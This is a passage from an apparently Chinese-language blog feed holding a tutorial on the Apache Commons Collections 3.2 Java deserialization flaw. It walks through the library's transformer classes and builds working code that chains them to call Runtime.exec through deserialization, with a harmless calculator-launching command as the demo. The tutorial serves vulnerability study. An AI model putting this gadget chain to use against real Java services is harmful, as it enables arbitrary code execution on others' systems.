class=&quot;name&quot;&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;2、代码分析&quot;&gt;&lt;a href=&quot;#2、代码分析&quot; class=&quot;headerlink&quot; title=&quot;2、代码分析&quot;&gt;&lt;/a&gt;2、代码分析&lt;/h3&gt;&lt;p&gt;由于漏洞原理一样，只是利用链不同，已经解释过的就不再重复介绍。&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Java 反序列化入门（一）</title>
    <link href="http://example.com/1970/01/01/Getting-Started-with-Java-Deserialization-1/"/>
    <id>http://example.com/1970/01/01/Getting-Started-with-Java-Deserialization-1/</id>
    <published>1969-12-31T16:00:04.000Z</published>
    <updated>2021-04-28T12:17:04.151Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文以 Apache Commons Collections 反序列化为例来介绍该类型漏洞的原理。</p></blockquote><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="1、漏洞复现环境"><a href="#1、漏洞复现环境" class="headerlink" title="1、漏洞复现环境"></a>1、漏洞复现环境</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- jdk 8 / Apache Commons Collections 组件版本如下 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2、代码分析"><a href="#2、代码分析" class="headerlink" title="2、代码分析"></a>2、代码分析</h3><p>首先查看 <strong>org.apache.commons.collections.functors.InvokerTransformer</strong> 代码片段：</p><span id="more"></span><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Constructor that performs no validation.</span></span><br><span class="line"><span class="comment">* Use &lt;code&gt;getInstance&lt;/code&gt; if you want that.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> methodName  the method to call</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> paramTypes  the constructor parameter types, not cloned</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> args  the constructor arguments, not cloned</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;<span class="comment">// 创建 InvokerTransformer 对象时参数皆可控</span></span><br><span class="line">  <span class="keyword">super</span>();</span><br><span class="line">  iMethodName = methodName;<span class="comment">// 方法名</span></span><br><span class="line">  iParamTypes = paramTypes;<span class="comment">// 参数类型</span></span><br><span class="line">  iArgs = args;<span class="comment">// 参数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Transforms the input to result by invoking a method on the input.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> input  the input object to transform</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> the transformed result, null if null input</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;<span class="comment">// 此方法的反射调用参数皆可控(iMethodName/iParamTypes/input/iArgs)，并且进行了反射调用</span></span><br><span class="line">    <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Class cls = input.getClass();<span class="comment">// 获取类对象</span></span><br><span class="line">        Method method = cls.getMethod(iMethodName, iParamTypes);<span class="comment">// 获取 public 方法信息</span></span><br><span class="line">        <span class="keyword">return</span> method.invoke(input, iArgs);<span class="comment">// 调用方法</span></span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>27L - 29L ：反射，Class/Method 类，invoke 方法请学习<a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1264803678201760">反射-调用方法</a>。</p><p>通过阅读 InvokerTransformer 代码可知，我们可以通过反射 Runtime 类的 exec 来执行命令，如下 Test.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Test.java</span></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 关于 Runtime 类执行命令就不做介绍了，自行查询或阅读源码。</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        InvokerTransformer invokerTransformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class&#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;open /System/Applications/Calculator.app&quot;</span>&#125;);</span><br><span class="line">        invokerTransformer.transform(Runtime.getRuntime());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是目标环境里不会有 <code>invokerTransformer.transform(Runtime.getRuntime());</code> 这行代码，所以我们需要通过将一个对象反序列化回来的过程中调用该方法。</p><p>我们继续观察其他继承 Transformer 的类。</p><p><strong>org.apache.commons.collections.functors.ChainedTransformer</strong> 代码片段：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Constructor that performs no validation.</span></span><br><span class="line"><span class="comment">* Use &lt;code&gt;getInstance&lt;/code&gt; if you want that.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> transformers  the transformers to chain, not copied, no nulls</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;<span class="comment">// 创建 ChainedTransformer 对象时需要传入 Transformer 类型的数组，并且 InvokerTransformer 继承了 Transformer</span></span><br><span class="line">    <span class="keyword">super</span>();</span><br><span class="line">    iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Transforms the input to result via each decorated transformer</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> object  the input object passed to the first transformer</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> the transformed result</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;<span class="comment">// 这个方法就有意思了，可以通过循环的方式调用 Transformer 对象的 transform 方法</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">        object = iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>org.apache.commons.collections.functors.ConstantTransformer</strong> 代码片段：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Constructor that performs no validation.</span></span><br><span class="line"><span class="comment">* Use &lt;code&gt;getInstance&lt;/code&gt; if you want that.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> constantToReturn  the constant to return each time</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> </span>&#123;<span class="comment">// 创建 ConstantTransformer 对象时可以传入任意一个 Object 对象</span></span><br><span class="line">    <span class="keyword">super</span>();</span><br><span class="line">    iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Transforms the input by ignoring it and returning the stored constant instead.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> input  the input object which is ignored</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> the stored constant</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;<span class="comment">// 直接返回创建 ConstantTransformer 对象时传入的 Object 对象</span></span><br><span class="line">    <span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用 <strong>ChainedTransformer</strong> 和 <strong>ConstantTransformer</strong> 可以将上面写的 Test.java 优化为 Test1.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Test1.java</span></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Transformer[] transformers = &#123;<span class="comment">// 创建一个 Transformer 数组，存放一个 ConstantTransformer 对象和 InvokerTransformer 对象</span></span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.getRuntime()),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;String.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;open /System/Applications/Calculator.app&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        transformerChain.transform(<span class="string">&quot;1&quot;</span>);<span class="comment">// ChainedTransformer 的 transform 方法会遍历执行 transformers 数组中每个对象的 transform 方法</span></span><br><span class="line">        <span class="comment">/* 调用过程如下</span></span><br><span class="line"><span class="comment">         * // ChainedTransformer.transform 第一次循环</span></span><br><span class="line"><span class="comment">         * object = constantTransformer.transform(&quot;1&quot;);// 在 10L 创建 ConstantTransformer 对象时，初始化传入的参数为 Runtime.getRuntime()，所以这里 object 取值为 Runtime.getRuntime()</span></span><br><span class="line"><span class="comment">         * // ChainedTransformer.transform 第二次循环</span></span><br><span class="line"><span class="comment">         * object = invokerTransformer.transform(Runtime.getRuntime());// 这行代码正好对应了我们第一次写的 Test.java 中的 9L</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于 Runtime 对象不允许序列化，所以继续优化 Test2.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Test2.java</span></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 经过 ChainedTransformer.transform 递归调用之后，数组中的 payload 等同于执行 (不理解请继续学习上面给出的反射调用文章)</span></span><br><span class="line">        <span class="comment">// ((Runtime)Runtime.class.getMethod(&quot;getRuntime&quot;).invoke(null)).exec(&quot;open /System/Applications/Calculator.app&quot;);</span></span><br><span class="line">        <span class="comment">/* 连 debug 都不想做并且脑内循环能力还弱的可以参考以下解释（新手向），如果能理解 13L 就不必看了。</span></span><br><span class="line"><span class="comment">         * ChainedTransformer.transform 循环过程如下，初始调用为代码 45L，参数为 &quot;1&quot;，同时作为初始的 object 开始执行</span></span><br><span class="line"><span class="comment">         * ConstantTransformer.transform(&quot;1&quot;) // 上面提到了 ConstantTransformer 的 transform 方法会直接返回创建对象时传入的 Object 对象,代码 22L 也就是 Runtime.class -&gt; object</span></span><br><span class="line"><span class="comment">         * InvokerTransformer.transform(Runtime.class) // InvokerTransformer 的 transform 方法会将创建 InvokerTransformer 时传入的三个参数(方法名，方法需要接收的参数类型，方法需要接收的参数) 进行反射调用，根据代码 23L 可知这次循环等同于执行 Runtime.class.getMethod(&quot;getRuntime&quot;) -&gt; object</span></span><br><span class="line"><span class="comment">         * InvokerTransformer.transform(Runtime.class.getMethod(&quot;getRuntime&quot;)) // 同样是 InvokerTransformer.transform，根据代码 24L 可知这次循环等同于执行 Runtime.class.getMethod(&quot;getRuntime&quot;).invoke(null) -&gt; object</span></span><br><span class="line"><span class="comment">         * InvokerTransformer.transform(Runtime.class.getMethod(&quot;getRuntime&quot;).invoke(null)) // 还是 InvokerTransformer.transform，根据代码 25L-27L 可知这次循环等同于执行 ((Runtime)Runtime.class.getMethod(&quot;getRuntime&quot;).invoke(null)).exec(&quot;open /System/Applications/Calculator.app&quot;) -&gt; object</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123; String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123; Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123; <span class="keyword">null</span> ,<span class="keyword">new</span> Object[<span class="number">0</span>]&#125; ),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;String.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;open /System/Applications/Calculator.app&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        <span class="comment">// 序列化写入</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            File f = <span class="keyword">new</span> File(<span class="string">&quot;expobject&quot;</span>);</span><br><span class="line">            ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(f));</span><br><span class="line">            out.writeObject(transformerChain);</span><br><span class="line">            out.flush();</span><br><span class="line">            out.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 反序列化读取</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileInputStream f = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;expobject&quot;</span>);</span><br><span class="line">            ObjectInputStream oin = <span class="keyword">new</span> ObjectInputStream(f);</span><br><span class="line">            Transformer expobject = (Transformer)oin.readObject();</span><br><span class="line">            expobject.transform(<span class="string">&quot;1&quot;</span>);<span class="comment">// 反序列化回来调用 transform （当然没人会替我们反序列化后再调用 transform 方法的，后面会继续优化）</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (FileNotFoundException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (ClassNotFoundException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>好，接下来就要想办法反序列化时执行 transform 方法，我们继续看代码</p><p><strong>org.apache.commons.collections.map.LazyMap</strong> 代码片段：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** The factory to use to construct elements */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Transformer factory;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Factory method to create a lazily instantiated map.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> map  the map to decorate, must not be null</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> factory  the factory to use, must not be null</span></span><br><span class="line"><span class="comment">* <span class="doctag">@throws</span> IllegalArgumentException if map or factory is null</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer factory)</span> </span>&#123;<span class="comment">// 创建 LazyMap 对象时传入构造好的 Transformer 对象</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> LazyMap(map, factory);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Constructor that wraps (not copies).</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> map  the map to decorate, must not be null</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> factory  the factory to use, must not be null</span></span><br><span class="line"><span class="comment">* <span class="doctag">@throws</span> IllegalArgumentException if map or factory is null</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="title">LazyMap</span><span class="params">(Map map, Transformer factory)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(map);</span><br><span class="line">    <span class="keyword">if</span> (factory == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.factory = factory;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//-----------------------------------------------------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;<span class="comment">// 如果能够触发这个方法，并且进入 if 分支，就可以调用 payload 的 transform 方法了</span></span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="keyword">false</span>) &#123;</span><br><span class="line">        Object value = factory.transform(key);<span class="comment">// factory 就是我们的 payload 啊</span></span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来继续寻找，想办法执行 <strong>LazyMap</strong> 的 get 方法。</p><p><strong>org.apache.commons.collections.keyvalue.TiedMapEntry</strong> 代码片段：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** The map underlying the entry/iterator */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Map map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Constructs a new entry with the given Map and key.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> map  the map</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> key  the key</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">TiedMapEntry</span><span class="params">(Map map, Object key)</span> </span>&#123;<span class="comment">// 创建这个对象时我们可以传入 LazyMap 对象，赋值给 map</span></span><br><span class="line">    <span class="keyword">super</span>();</span><br><span class="line">    <span class="keyword">this</span>.map = map;</span><br><span class="line">    <span class="keyword">this</span>.key = key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Gets the value of this entry direct from the map.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> the value</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getValue</span><span class="params">()</span> </span>&#123;<span class="comment">// 然后这里就可以用我们的 LazyMap 调用 get 方法了</span></span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Gets a string version of the entry.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> entry as a string</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;<span class="comment">// 这里调用了 getValue 